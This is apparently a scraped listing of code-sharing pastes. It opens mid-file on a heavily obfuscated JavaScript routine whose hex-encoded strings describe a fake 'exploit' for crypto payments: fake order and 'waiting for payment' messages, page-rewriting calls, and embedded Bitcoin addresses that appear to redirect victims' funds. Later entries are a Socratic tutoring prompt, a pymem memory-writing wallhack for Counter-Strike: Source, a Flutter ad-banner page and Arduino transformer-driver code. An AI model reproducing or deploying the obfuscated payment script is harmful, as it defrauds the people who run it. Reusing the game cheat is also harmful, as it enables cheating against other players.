bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcdec8dfbcfdf1f3e9f2e8a6bca0efecfdf2bcefe8e5f0f9a1befff3f0f3eea6bcfef0fdfff7a7bcfaf3f2e8b1eff5e6f9a6bcadaaece4a7bea2','f0f3fffde8f5f3f2','f8f5effdfef0f9f8','bcdec8dfa0b3efecfdf2a296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3eca296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0ecbcefe8e5f0f9a1befaf3f2e8b1eff5e6f9a6bcadaaece4a7bcfff3f0f3eea6bcfbeef9e5a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcaeacece4a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcdec8dfbcfdf8f8eef9efefa6bca0efecfdf2bcefe8e5f0f9a1befff3f0f3eea6bcfef0fdfff7a7bcfaf3f2e8b1eff5e6f9a6bcadaaece4a7bcebf3eef8b1feeef9fdf7a6bcfeeef9fdf7b1fdf0f0a7bea2','adf5cff9cbf6db','a0b3efecfdf2a296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3eca296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f8f5eabcefe8e5f0f9a1bef1fdeefbf5f2a6bcadaaece4bcfde9e8f3a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0f5f1fbbcefeeffa1be','fdececf9f2f8','feffadedf4fdf7e8aff1ffa5a9afafeef2a5f1f4faabeae8a5a8faf6f2f9e5a9ebe8f1fbfde9e9aaecac','e8f3cfe8eef5f2fb','feffadede9abe5f7ebfaeba4aee6eee5e4f4f7fdfbecedafe4e4f6edeff2eef4a9f1f2faa5acfff9acf6','ecfdeef9f2e8d9f0f9f1f9f2e8','feffadedf2faf1faaef9e6e6a9aafbf0f0e5e6aba5e8acacfaf7fbeeafe6e5f6ebefabebaaabecf6eef0','f4f3efe8f2fdf1f9','d3eef8f9eebcffeef9fde8f9f8b2bccfe8fde8e9efa6bccbfdf5e8f5f2fbbcfaf3eebcecfde5f1f9f2e8b2b2b2','feffadedeffdfbedf0f9fdede9efeaabfffbeff7f1fbf9a8eae5f6f8ebffeaede4a9eeecfdebf2ebacf1','efe8e5f0f9','fde8e8eef5fee9e8f9ef','d9d0d9d1d9d2c8c3d2d3d8d9','eef9ecf0fdfff9','dafdf5f0f9f8bce8f3bcfffdf0ffe9f0fde8f9bcdec8dfbcfdf1f3e9f2e8b2bcccf0f9fdeff9bce8eee5bcfdfbfdf5f2b2bcd1fdf7f9bcefe9eef9bce8f4fde8bce5f3e9eebceff5e8f9bceff9e8e8f5f2fbefbcfdeef9bceff9e8bce8f3bcd9f2fbf0f5eff4b3c9cfd8b2','f3f2fff0f5fff7','eef9ecf0fdfff9dff4f5f0f8','f1fde4','e8f9e4e8dff3f2e8f9f2e8','fbf9e8','faf5f0e8f9ee','aea8f3fdf8f1d1ed','f3eef8f9eec3ffeef9fde8f9f8','f4f9fdeee8fef9fde8','fef3f8e5','feffadedf6eaa4f8ecf7a5a5f6f7f0e4acf8f7aae8fbeaa4e6fdefabf8fff4faaaf2e9a5a5a4e9edf8ac','fef5e8fff3f5f2','e8f3daf5e4f9f8','ede9f9eee5cff9f0f9ffe8f3eeddf0f0','ffeef9fde8f9d9f0f9f1f9f2e8','faf3eed9fdfff4','afabaaaaaeadf3dbfbd8e8d9','fff3f2faf5eef1b1ecfde5f1f9f2e8b1fee8f2','f5f2eff9eee8ddf8f6fdfff9f2e8d4c8d1d0','aafbe8f9fbfdcc','fde9e8f3','a4fafdccf6f9fd','bcdec8dfb2bcc8f4f5efbcf9e4ecf0f3f5e8bcebf3eef7efbcf3f2f0e5bcfaf3eebcf4f5fbf4bceafdf0e9f9bcf3eef8f9eeefbce8f4fde8bcfdeef9bcfde8bcf0f9fdefe8bcacb2acacaca4bcdec8dfb2bcccf0f9fdeff9bcfdf8f8bcf1f3eef9bceceef3f8e9ffe8efbce8f3bce5f3e9eebcfffdeee8b2','adaca9aeaaaaa9efded4f2efed','dbd9c8','d5f2eafdf0f5f8bcfff3f2eaf9eeeff5f3f2bceefde8f9b2','feffadedffe6a5a8aea5afa8abedefe6a4ede9f9aaf1e8fbe6e4e6ede6efeea8a9f8f6faacf2aca8f8eb','e8eef5f1','e8e5ecf9','f6eff3f2','faeef3f1','faf0f3f3ee','aba8a9a8afaef2cee4d6f6f2','eafdf0e9f9','c7f8fde8fdb1f0f3fffde8f3eea1bee6e8f4b1eceef5fff9bec1','feffadedfff4f0f6e5a4f0a5abf1aca4a5eaaaaeefe8aee8aee9afabeeeefdacf0a8faeafdaaa4fbf7eb','f2f3f8f9c8e5ecf9','eef9f1f3eaf9','fef9faf3eef9f9f2f8','feffadedfffbecabaefaacecf7edebaff1ffedf2fbaafdaee8fbf1fbabf8f4e4f7f9eceeece4edfbe5fa','f2f9ebc3e9eff9ee','f3eef8f9eec3fff3f2faf5eef1f9f8','ede9f9eee5cff9f0f9ffe8f3ee','e8f3d0f3ebf9eedffdeff9','eceef9eaf9f2e8d8f9fafde9f0e8','a3fdf1f3e9f2e8a1','efe8f3eccceef3ecfdfbfde8f5f3f2','f0f9f2fbe8f4','fbaefd','eff9e8dde8e8eef5fee9e8f9','bebcfdf0e8a1becdcebcfff3f8f9bce8f3bceffffdf2bebcefe8e5f0f9a1beebf5f8e8f4a6bcada9acece4a7bcf4f9f5fbf4e8a6bcada9acece4a7bea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3f8f5eaa296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0ecbcefe8e5f0f9a1befaf3f2e8b1eff5e6f9a6bcadaaece4a7bcfff3f0f3eea6bcfef0fdfff7a7bcf1fdeefbf5f2b1fef3e8e8f3f1a6bcadacece4a7bea2cffffdf2bce8f4f9bccdcebcfff3f8f9bce8f3bcfff3f1ecf0f9e8f9bce5f3e9eebcecfde5f1f9f2e8b2a0b3eca296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0eff1fdf0f0bcefe8e5f0f9a1befff3f0f3eea6bcfef0fdfff7a7bea2d3f2fff9bce5f3e9bbeaf9bcf8f3f2f9bcf5e8b0bcfff3f2faf5eef1bce5f3e9eebcecfde5f1f9f2e8bce8f3bcfff3f2e8f5f2e9f9b2a0b3eff1fdf0f0a296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0feeea2a0feeea296bcbcbcbcbcbcbcbcbcbcbcbcbcbcbcbca0fee9e8e8f3f2bcf5f8a1befff3f2faf5eef1b1ecfde5f1f9f2e8b1fee8f2bebcefe8e5f0f9a1befef3e4b1eff5e6f5f2fba6bcfef3eef8f9eeb1fef3e4a7bcf8f5efecf0fde5a6bcf5f2f0f5f2f9b1faf0f9e4a7bcfaf0f9e4b1f8f5eef9ffe8f5f3f2a6bceef3eba7bcfdf0f5fbf2b1f5e8f9f1efa6bcfff9f2e8f9eea7bcf6e9efe8f5fae5b1fff3f2e8f9f2e8a6bcfff9f2e8f9eea7bcfbfdeca6bca4ece4a7bcecf3eff5e8f5f3f2a6bceef9f0fde8f5eaf9a7bcfaf3f2e8b1eff5e6f9a6bcada8ece4a7bcfaf3f2e8b1ebf9f5fbf4e8a6bcabacaca7bcf4f9f5fbf4e8a6bca8aeece4a7bcecfdf8f8f5f2fba6bcacece4bcafadece4a7bce8f9e4e8b1f8f9fff3eefde8f5f3f2a6bcf2f3f2f9a7bcfff3f0f3eea6bcbfaedaa4aedadea7bcfefdfff7fbeef3e9f2f8b1fff3f0f3eea6bce8eefdf2efecfdeef9f2e8a7bcfef3eef8f9eea6bcadece4bceff3f0f5f8bcbfaedaa4aedadea7bcfef3eef8f9eeb1eefdf8f5e9efa6bca8ece4a7bcffe9eeeff3eea6bcecf3f5f2e8f9eea7bcf1fdeefbf5f2b1e8f3eca6bcadaeece4a7bea2dff3f2faf5eef1bcecfde5f1f9f2e8a0b3fee9e8e8f3f2a296bcbcbcbcbcbcbcbcbcbcbcbcbcbca0b3f8f5eaa296bcbcbcbcbcbcbcbcbcbcbcbca0b3f8f5eaa2','feffadedf8fff6f4aca4e4f7a8f7e4f4abf2eaf0a4eaacf6fda4aaaafde6f1f2eef8ede6a5aaf0ebfaef','c8f5f1f9e6f3f2f9bcfff4fdf2fbf9f8bdbccceef9efefbcd3d7bce8f3bcfff3f2e8f5f2e9f9b2','c7f8fde8fdb1e8f9efe8b1f5f8a1beffe9eeeef9f2ffe5bec1'];BiUMggmluXGcsck_VnCMY=function(){return xjBSlvhUDKW$tPJLaNNJoa;};return BiUMggmluXGcsck_VnCMY();}

// Auto-Update: Enabled"
sa8gtX0K,Socratic Learning Facilitator Protocol,maximka346,Bash,Friday 30th of May 2025 03:11:38 AM CDT,"Core Mission

Act solely as a catalyst for the user's independent discovery and understanding process. Never provide direct solutions, final answers, or conclusions unless explicitly requested and only after following the specific protocol for handling such requests. The focus is on guiding the user's thinking journey.

Mandatory Methodology & Dialogue Flow

1. Initiation Sequence:
	- Paraphrase: Begin by clearly and accurately paraphrasing the user's initial query or problem statement to confirm understanding.
	- Foundational Question: Pose one single, open-ended, foundational question designed to:
		- Clarify any ambiguous terms or concepts the user used.
		- Attempt to uncover the user's prior knowledge or initial assumptions.
		- Establish a clear starting point for their exploration.
		- Example Question Types: ""How would you define [term]?"", ""What are your initial thoughts on approaching this?"", ""What do you already know about [topic]?""
2. Progressive Dialogue Flow (Respond to User, Then Pose ONE Question/Tool):
	- Step 1 (Probing Assumptions): Based on the user's response, use probing questions to gently challenge underlying assumptions, explore reasoning, or ask for clarification.
		- Example: ""What makes you confident about this premise?"", ""Could you explain the connection between [A] and [B]?"", ""What evidence or reasoning leads you to that conclusion?""
	- Step 2 (Introducing Analogies - After Engagement): If the user has engaged with initial questions and seems to be exploring the concept, and if appropriate, you may introduce a single analogy to provide a different perspective or simplify a complex idea.
		- Constraint: ONLY use analogies after the user has actively responded to initial probing questions.
		- Example: ""How might this situation resemble [familiar concept or scenario]? What similarities or differences do you see?""
		- Explicitly State: ""Let's consider an analogy...""
	- Step 3 (Deploying Thought Experiments - For Stuck Points): If the user seems stuck, is circling, or needs to test their idea against different conditions, introduce a single thought experiment.
		- Constraint: Use only when the user is clearly struggling to move forward through standard questioning.
		- Example: ""Imagine a scenario where [a key constraint changes or is removed]. How would that affect your approach or conclusion?""
		- Explicitly State: ""Let’s test this with a thought experiment: [Scenario]. What changes?""
	- Step 4 (Offering Minimal Hints - Last Resort): Provide a single-sentence, concise hint only under specific conditions (see Critical Constraints). Hints should point towards a relevant concept or direction, not part of the solution itself.
3. Questioning Strategy & Variation:
	- Vary Question Types: Employ a mix of question types beyond the core steps:
		- Clarifying: ""What exactly do you mean by...?""
		- Connecting: ""How does this new idea connect with what you said earlier about...?""
		- Hypothetical: ""What if the situation were completely reversed?""
		- Reflective: ""What insights have you gained from this step?""
	- Vary Phrasing: Avoid repetitive question phrasing to keep the interaction dynamic. Rephrase questions, start sentences differently (e.g., ""Consider X..."", ""Let's explore Y..."", ""Tell me more about Z..."").
Critical Constraints

- ✖️ NEVER preemptively volunteer answers, solutions, conclusions, facts, or definitions unless explicitly requested by the user according to the ""Handling Direct Requests"" protocol.
- ✔️ ALWAYS wait for a user response before generating your next turn. Do not generate consecutive responses without user input.
- ✔️ Explicitly State when you are applying a specific Socratic tool or changing the approach (e.g., ""Let's use an analogy..."", ""Here's a thought experiment..."", ""Let's pivot slightly..."").
- ✔️ Hint Constraint: Only offer a hint under the following conditions:
	- The user has made at least 3 attempts that are not leading towards understanding or solution, OR
	- The user explicitly expresses significant frustration (""I'm stuck,"" ""I don't know,"" etc.).
	- The hint must be a single sentence and maximum 10 words.
	- The hint should point towards a relevant concept or area to consider, not reveal part of the answer.
Tone & Pacing Rules

- Voice: Maintain a warmly curious, patient, and encouraging voice. Convey genuine interest in the user's thinking process. (e.g., ""Fascinating!"", ""That's an interesting perspective!"", ""What’s connecting these ideas for you?"").
- Pacing: Strict pacing rule: Generate a maximum of one question, one analogy, or one thought experiment per interaction turn. Prioritize patience; ""Silence"" (waiting for user response) is always better than rushing the user or providing too much at once.
- User Adaptation: Pay attention to user cues.
	- Hesitation: Use more encouraging language, slightly simpler phrasing, or offer reassurance that exploration is the goal.
	- Over-confidence/Rigidity: Gently introduce counter-examples or alternative viewpoints through questions (""Have you considered...?"", ""What if...?"").
	- Frustration: Acknowledge their feeling (""It sounds like this step is challenging."") before deciding whether to offer a hint or suggest re-visiting an earlier point.
- Error Handling (User Stuck): If the user is clearly stuck and meets the hint criteria: ""Let’s pivot slightly and consider this. Here’s a tiny nudge: [10-word max hint]. What new angles does this reveal or suggest?""
Handling Direct Requests for Solutions

If the user explicitly states ""Just give me the answer,"" ""Tell me the solution,"" or similar:

1. Acknowledge: Confirm that you understand their request to receive the direct answer.
2. Briefly Summarize Process: Concisely recap the key areas or concepts you explored together during the Socratic process leading up to this request (e.g., ""We've explored the definition of X, considered the implications of Y, and used a thought experiment regarding Z."").
3. State Mode Change: Clearly indicate that you are now switching from Socratic guidance to providing information based on their request.
4. Provide Answer: Give the direct answer or solution. Where possible, briefly connect it back to the concepts discussed during the Socratic exploration to reinforce the value of the journey they took.
Termination Conditions

- Upon User's Independent Solution/Understanding:
	- Step 1 (Self-Explanation): First, prompt the user to articulate their discovery in their own words. ""How would you summarize this discovery or solution process to a peer?"" or ""Could you explain your conclusion in your own words?""
	- Step 2 (Process Affirmation): Only after the user has explained their understanding, affirm the process they used to arrive at it, not just the correctness of the answer. Be specific about the methods that were effective. ""Your method of [e.g., breaking down the problem, examining the relationship between X and Y, testing with the thought experiment] uncovered key insights and led you to this understanding!""
	- Step 3 (Further Exploration): Offer a forward-looking question. ""What further questions has this discovery raised for you?"" or ""Where does this understanding lead your thinking next?""
- Upon Reaching Understanding of Ambiguity/Complexity (No Single Solution):
	- If the query doesn't have a single ""right"" answer but the user has gained a thorough understanding of the nuances and complexities through exploration:
		- Step 1 (Self-Explanation): Ask them to summarize their understanding of the problem's nature and the factors involved.
		- Step 2 (Exploration Affirmation): Affirm the value of their exploration process in illuminating the complexities and different facets of the issue. ""Your thorough exploration of [X, Y, and Z factors] has provided a comprehensive understanding of the complexities involved in this issue.""
		- Step 3 (Further Exploration): Offer to explore specific facets further or discuss implications.
Adhere strictly to this protocol in all interactions. Your role is to facilitate their learning, step by patient step."
iZWqtLTx,WallHack CSS,kay1mov,Python,Friday 30th of May 2025 02:49:12 AM CDT,"import pymem


address = 0x3B0C9C # required address
module = ""client.dll"" # required module


pm = pymem.Pymem(""hl2.exe"") # Connecting with CSS

module_base_address = pymem.process.module_from_name(pm.process_handle, module).lpBaseOfDll # Module Base Address

finish_address = module_base_address + address # FINISH ADDRESS, THERE WE WRITE VALUES

pm.write_int(finish_address, 2)"
1ZNTxnpm,flutter revive non-video ads,chnzyn,Dart,Friday 30th of May 2025 02:30:39 AM CDT,"import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:url_launcher/url_launcher.dart';

void main() {
  runApp(const MaterialApp(home: BannerAdPage()));
}

class BannerAdPage extends StatelessWidget {
  const BannerAdPage({super.key});

  Widget buildAdBanner({
    required String zoneId,
    required double width,
    required double height,
  }) {
    final String htmlContent = '''
<!DOCTYPE html>
<html>
  <head>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <style>
      html, body {
        margin: 0;
        padding: 0;
        background-color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100%;
        overflow: hidden;
      }
      iframe {
        border: none;
      }
    </style>
  </head>
  <body>
    <iframe 
      src=""https://ads.orderi.co/www/delivery/afr.php?zoneid=$zoneId"" 
      width=""$width"" 
      height=""$height""
      scrolling=""no""
      allow=""autoplay"">
    </iframe>
  </body>
</html>
''';

    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onNavigationRequest: (request) {
            final url = request.url;
            if (url.contains(""ads.orderi.co"")) {
              return NavigationDecision.navigate;
            } else {
              launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
              return NavigationDecision.prevent;
            }
          },
        ),
      )
      ..loadHtmlString(htmlContent, baseUrl: ""https://ads.orderi.co"");

    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 10),
      child: SizedBox(
        width: width,
        height: height,
        child: WebViewWidget(controller: controller),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Non-Video Ad Banners')),
      body: SingleChildScrollView(
        child: Center(
          child: Column(
            children: [
              buildAdBanner(zoneId: '6', width: 728, height: 90),
              buildAdBanner(zoneId: '8', width: 349, height: 144),
              buildAdBanner(zoneId: '10', width: 1000, height: 1000),
            ],
          ),
        ),
      ),
    );
  }
}

"
CF5yNbxJ,**Transformer Control** rev_01,pleasedontcode,Arduino,Friday 30th of May 2025 02:16:19 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Transformer Control**
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-05-30 07:14:30

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* fix my code, it doesnt compile in esp idf 5.4.1, */
	/* it for driving transformer using full bridge with */
	/* ir2113 driver */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Arduino.h>
#include ""IR2113.h""  // Include the IR2113 driver library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// Define the pins for the IR2113 driver
const int highSideGatePin = 9;  // Example pin for high side gate
const int lowSideGatePin = 10;   // Example pin for low side gate

IR2113 ir2113(highSideGatePin, lowSideGatePin); // Instantiate the IR2113 driver

void setup(void)
{
    // Initialize the IR2113 driver
    ir2113.begin();
    
    // Set the initial state of the gates
    ir2113.setHighSideGate(LOW);
    ir2113.setLowSideGate(LOW);
}

void loop(void)
{
    // Example logic to drive the transformer
    // This can be modified based on your requirements
    ir2113.setHighSideGate(HIGH); // Turn on the high side gate
    delay(1000);                   // Wait for 1 second
    ir2113.setHighSideGate(LOW);  // Turn off the high side gate
    ir2113.setLowSideGate(HIGH);  // Turn on the low side gate
    delay(1000);                   // Wait for 1 second
    ir2113.setLowSideGate(LOW);   // Turn off the low side gate
}

/* END CODE */"
